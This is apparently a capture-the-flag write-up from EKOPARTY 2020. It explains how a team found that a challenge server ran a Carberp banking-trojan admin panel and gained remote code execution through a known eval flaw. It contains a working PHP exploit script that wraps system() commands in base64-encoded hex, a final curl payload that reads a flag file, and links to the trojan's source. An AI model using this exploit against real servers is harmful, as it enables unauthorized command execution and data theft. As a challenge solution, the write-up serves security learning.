> ADMIN

![](https://raw.githubusercontent.com/estebancano-dev/CTF-Writeups/master/20200924%20EKOPARTY%202020/Tasks/Screenshot_20200927-171458.png)

Solved by: [@fernetInjection](https://twitter.com/fernetInjection "@fernetInjection")

We are given a webserver on `http://admin.eko.cap.tf:10000` with an HTTP 500 response and the info in the image above.

Doing some dirsearch we found an `install.txt` file with some russian steps to install something.. In the info we can see something about Apache `mod_xsendfile`, so digging up a bit and reading https://tn123.org/mod_xsendfile/ we found that if a request header is sent with a file name (and this mod is enabled) we can MAYBE download arbitrary files.

We did our best to exploit this but with no luck.

Doing more googling we found this bank trojan source code https://github.com/nyx0/Carberp. We compared the folders obtained in our scans and matched the ones under https://github.com/huntpig/Carberp-1/tree/master/adminpanel/bot_adm

So the banking trojan of the task is `Carberp`.

After digging a lot we foud that there is an RCE vunerabilitie in the banking trojan (the buster got busted). We can see it here https://vulners.com/zdt/1337DAY-ID-21658

Using this modified exploit code we got RCE.

```php
<table width="607" border="0">
    <tr>
        <td><form method="POST" action="<?php basename($_SERVER['PHP_SELF']) ?>">
                <label for="carberp">Domain: </label>
                <input type="submit" name="button" id="button" value="Ownz !" />
            </form></td>
    </tr>
    <tr>
        <td>
            <?php
            $data = array(
                'id' => 'BOTNETCHECKUPDATER0-WD8Sju5VR1HU8jlV',
                'data' => base64_encode(bin2hex("system('" . $_POST['data'] . "');"))
            );
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, "http://admin.eko.cap.tf:10000/scripts/pat/builds.php");
			//curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:','X-Sendfile:/var/www/html/.ht_flag'));
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_TIMEOUT, 30);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
            $contents = curl_exec($ch);
            curl_close($ch);
            echo "<pre>" . $contents . "</pre>";
            ?>
        </td>
    </tr>
</table>
```

We used `http://admin.eko.cap.tf:10000/scripts/pat/builds.php` because that was one of the files we were looking at the source code (and later we found that a lot of php files has the vulnerable `eval` function), but `/index.php` should have worked too.

The vulnerable code in Carberp is this one:
`if(!empty($_POST['data'])) eval(pack("H*", base64_decode($_POST['data'])));`

So if we send a POST request with data set with some encoded content we can get eval() function evaluate our payload. The payload is encoded with `base64_encode(bin2hex())` PHP's functions, as you can see in line 13 of the code

So we executed `cat /var/www/html/.htaccess` we can see that mod_xsendfile was on with the directive `XSendFile on`, so our initial approach maybe was right (we want to know if there was more than one way to solve the challenge)

Doing `ls -al /var/www/html` we found .ht_flag file. We did `cat /var/www/html/.ht_flag`. At first the exploit code was filtering the results, so we went back to a mix of this exploit and `X-Sendfile:/var/www/html/.ht_flag` header, with no luck).

So after some tweeking of the original code we got the flag

Final payload in curl:
```
curl -i -s -k -X $'POST' \
    -H $'Host: admin.eko.cap.tf' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 145' \
    --data-binary $'id=BOTNETCHECKUPDATER0-WD8Sju5VR1HU8jlV&data=NzM3OTczNzQ2NTZkMjgyNzYzNjE3NDIwMmY3NjYxNzIyZjc3Nzc3NzJmNjg3NDZkNmMyZjJlNjg3NDVmNjY2YzYxNjcyNzI5M2I=' \
    $'http://admin.eko.cap.tf:10000/scripts/pat/builds.php'
```

`NzM3OTczNzQ2NTZkMjgyNzYzNjE3NDIwMmY3NjYxNzIyZjc3Nzc3NzJmNjg3NDZkNmMyZjJlNjg3NDVmNjY2YzYxNjcyNzI5M2I=` is `base64_encode(bin2hex('system('cat /var/www/html/.ht_flag');'))`

#### EKO{C4rb3rppppppp}



